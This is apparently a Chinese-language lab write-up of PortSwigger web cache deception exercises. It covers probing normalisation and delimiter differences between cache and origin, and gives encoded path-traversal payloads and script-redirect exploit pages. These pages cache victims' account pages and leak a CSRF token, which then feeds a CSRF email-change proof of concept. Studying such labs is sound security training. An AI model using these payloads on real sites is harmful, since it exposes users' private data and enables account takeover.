## 利用静态目录缓存规则

### 利用源服务器的规范化处理

对账户页面的请求为
GET /my-account HTTP/2
响应中包含敏感信息

对静态目录的请求返回缓存命中
GET /resources/js/tracking.js HTTP/2
X-Cache


添加前缀
GET /resources/../my-account HTTP/2
此时返回缓存头部，且第二次得到 X-Cache: hit

服务器使用规范化解析，而缓存不使用规范化或不解码

> 路径遍历序列中的每个点段都需要进行编码。否则，受害者的浏览器会在将请求转发到缓存之前解析它

构建发送到目标用户的页面，确保对斜杠 / 进行编码 %2f，否则仅能够在本机触发，添加缓存破坏或等待缓存过期
<script>
document.location="https://0afa00be03994d5280ae0329003a0031.web-security-academy.net/resources/..%2fmy-account"
</script>
在目标用户访问后，请求相同url，响应为 X-Cache: hit，内容为目标用户的信息

### 利用缓存服务器进行规范化
实验：利用缓存服务器规范化进行网页缓存欺骗
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization

对账户页面的请求为
GET /my-account HTTP/2
响应中包含敏感信息

GET /resources/../my-account HTTP/2
"Not Found"
源服务器不做规范化

测试静态资源
GET /resources/./js/tracking.js HTTP/2
返回错误代码，同时显示缓存，缓存服务器进行规范化

发送到攻击器，测试源服务器分隔符号
GET /my-account$$foo HTTP/2
得到200响应的符号为
```
#
?
%23
%3F
```

构建攻击向量，头部使用源服务器前缀，并添加分隔符号 #的url编码%23，由于目标浏览器不发送#，于是使用url编码的。尾部使用代理服务器格式化缓存路径
此处使用?时，响应中不包含缓存头部。
/my-account%23%2F..%2Fresources%2Ffoo.js

<script>
document.location="https://0a7100940478868b81f48e26000d00d4.web-security-academy.net/my-account%23%2F..%2Fresources%2Fpayloadfoo.js"
</script>

## 利用文件名缓存规则
实验室：利用精确匹配缓存规则进行网络缓存欺骗
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules

浏览中未发现缓存头部
对 基于文件名的缓存 进行测试
robots.txt 和 favicon.ico 可被缓存

对缓存与源服务器差异进行测试
GET /./favicon.ico HTTP/2
响应中包含缓存头部，内容为 "Not Found"
源服务器不进行规范化
缓存服务器进行规范化

测试分隔符号，取消攻击器的字段编码符号选项
/favicon.ico$$aa
返回200的有
```
;
?
%3F
```


符号 ? 的响应存在缓存头部的同时包含原始数据
/favicon.ico?aa
符号被两个服务器同时视为分隔符，排除

构建，首部为源服务器向量，尾部为缓存服务器向量
/my-account;%2f%2e%2e%2ffavicon.ico
成功返回主体并拥有缓存头部
若此处使用未进行url编码的原符号则无法返回原主体

此时的缓存欺骗可获得表单的csrf令牌，
继续尝试获取cookie

第一次发送
```html
<script>
document.location="https://0a7100940478868b81f48e26000d00d4.web-security-academy.net/my-account;%2f%2e%2e%2ffavicon.ico"
</script>
```
在拦截代理服务器的响应中得到csrf令牌
t2TodD8bQKKVAb38lIXJg3DELysZ9Yhu

第二次构建CSRF概念验证，设置表单为更改邮件的url，填入得到的反CSRF令牌
